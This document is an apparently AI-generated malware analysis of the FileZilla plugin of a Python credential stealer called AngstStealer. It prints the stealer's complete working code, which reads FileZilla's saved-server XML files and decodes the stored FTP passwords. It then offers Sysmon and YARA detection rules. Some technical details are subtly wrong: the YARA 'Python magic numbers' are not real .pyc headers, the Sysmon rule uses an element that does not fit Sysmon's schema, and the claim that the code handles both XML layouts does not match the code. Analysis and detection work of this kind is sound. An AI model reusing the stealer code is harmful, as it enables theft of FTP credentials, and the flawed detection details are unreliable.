# AngstStealer - FileZilla FTP Credential Harvesting via XML Configuration Files

**Repository:** `MalwareSourceCode-main`  
**File:** `Python/Trojan.Python.AngstStealer/Trojan.Python.AngstStealer/plugins/filezilla.py`  
**Language:** Python  
**MITRE ATT&CK:** T1555.003 (Credentials from Password Stores), T1005 (Data from Local System)

## Overview

AngstStealer implements targeted FTP credential theft by parsing FileZilla's XML configuration files. FileZilla stores server credentials—host, port, username, and password—in plaintext XML files. While the password is Base64 encoded, this is a form of obfuscation, not encryption, and is trivially reversible. This stealer exemplifies file-based credential collection from a specific, high-value application. Access to FTP servers can often lead to compromise of web servers, backup systems, and sensitive file repositories.

## Code Snippet & Analysis

The core logic resides in the `grab_saved` method, which executes upon the `FileZilla` class instantiation.

```python
import os
import base64
import xml.etree.ElementTree as ET

class FileZilla(object):
    """
    Simple implementation of grabbing saved passwords from the filezilla
    config logs
    """
    def __init__(self):
        self.saved = ""
        self.grab_saved()

    def grab_saved(self):
        """
        Grabs stored passwords from the default filezilla config file, 
        if non-existant then it will return nothing.
        """
        # 1. Locate the FileZilla configuration directory
        filezilla_path =  os.path.join(os.getenv("APPDATA"), "FileZilla")

        # 2. Check for the existence of recentservers.xml
        if os.path.exists(filezilla_path):
            saved_pass_file = os.path.join(filezilla_path, "recentservers.xml")
            if not os.path.exists(saved_pass_file):
                # Also check for sitemanager.xml as a fallback
                saved_pass_file = os.path.join(filezilla_path, "sitemanager.xml")

            if os.path.exists(saved_pass_file):
                # 3. Parse the XML file
                xml_tree = ET.parse(saved_pass_file).getroot()
                
                # Support for both recentservers.xml and sitemanager.xml structures
                if xml_tree.findall('RecentServers/Server'):
                    servers = xml_tree.findall('RecentServers/Server')
                else:
                    servers = xml_tree.findall('Server') # sitemanager.xml has a flatter structure

                # 4. Iterate through server entries and extract credentials
                for server in servers:
                    host = server.find('Host').text
                    port = server.find('Port').text
                    user = server.find('User').text
                    # 5. Decode the Base64-encoded password
                    password = base64.b64decode(server.find('Pass').text).decode()
                    
                    self.saved += f"==== FileZilla ====\nHOST: {host}\nPORT: {port}\nUSER: {user}\nPASS: {password}\n"
```

### What it does:

1.  **Locates Configuration:** The code constructs the path to the FileZilla directory within the user's `%APPDATA%\Roaming` folder.
2.  **Finds Credential Files:** It specifically looks for `recentservers.xml` (which stores the last 10 connected servers) and `sitemanager.xml` (which stores all user-saved sites).
3.  **Parses XML:** It uses Python's `xml.etree.ElementTree` to parse the XML structure. It intelligently handles the slightly different structures of `recentservers.xml` (`<RecentServers><Server>`) and `sitemanager.xml` (`<Servers><Server>`).
4.  **Extracts Data:** It iterates through each `<Server>` entry, extracting the `Host`, `Port`, and `User` text values.
5.  **Decodes Password:** It finds the `<Pass>` element, decodes the Base64-encoded password, and converts it back to a readable string.
6.  **Aggregates Results:** The extracted credentials are formatted and appended to the `self.saved` string for exfiltration.

### Why it's a TTP:

This is a classic example of **T1555.003 - Credentials from Password Stores**. Although FileZilla is not a web browser, the principle is identical: the malware targets a specific application's local storage where credentials are saved in a weakly protected format. It also aligns with **T1005 - Data from Local System**, as it involves collecting specific files from the user's machine. The code's directness—locating a known file and parsing it—is a highly efficient way for attackers to harvest valuable access credentials with minimal effort.

## Detection & Evasion

### Sysmon Rule

A Sysmon rule can be crafted to detect suspicious processes accessing FileZilla's configuration files. Legitimate access is typically only from `filezilla.exe`.

```xml
<Sysmon schemaversion="4.82">
    <EventFiltering>
        <RuleGroup name="FileZilla Credential Theft" groupRelation="or">
            <FileAccess onmatch="include">
                <!-- Detects access to FileZilla credential files -->
                <TargetFilename condition="end with">\FileZilla\recentservers.xml</TargetFilename>
                <TargetFilename condition="end with">\FileZilla\sitemanager.xml</TargetFilename>
                <!-- Exclude legitimate access by FileZilla itself -->
                <Image condition="is not">C:\Program Files\FileZilla FTP Client\filezilla.exe</Image>
            </FileAccess>
        </RuleGroup>
    </EventFiltering>
</Sysmon>
```
**Note:** This rule is high-fidelity but might trigger on backup software or other administrative scripts. The key is to investigate the process (`Image`) that is accessing the file.

### Yara Rule

A Yara rule can identify Python-based stealers that use the same methods as AngstStealer.

```yara
rule TTP_AngstStealer_FileZilla_Harvest
{
    meta:
        author = "GitHub Copilot"
        description = "Detects Python-based stealers targeting FileZilla XML configuration files, like AngstStealer."
        mitre_ttp = "T1555.003"
        malware = "AngstStealer"
    strings:
        // Core Functionality
        $s1 = "recentservers.xml"
        $s2 = "sitemanager.xml"
        $s3 = "FileZilla"
        $s4 = "os.getenv"
        $s5 = "APPDATA"
        $s6 = "base64"
        $s7 = "xml.etree.ElementTree"

        // FileZilla XML structure
        $x1 = "RecentServers/Server"
        $x2 = "Pass"
        $x3 = "Host"
        $x4 = "User"

    condition:
        // More specific: requires python magic and key strings
        (uint32(0) == 0x61797243 or uint32(0) == 0x65766f4d) and
        all of ($s*) and 3 of ($x*)
}
```
**Note:** The `uint32(0)` check looks for Python magic numbers for `.pyc` files, making the rule more specific to compiled Python scripts. The condition requires all the setup strings (`$s*`) and at least three of the XML parsing strings (`$x*`).
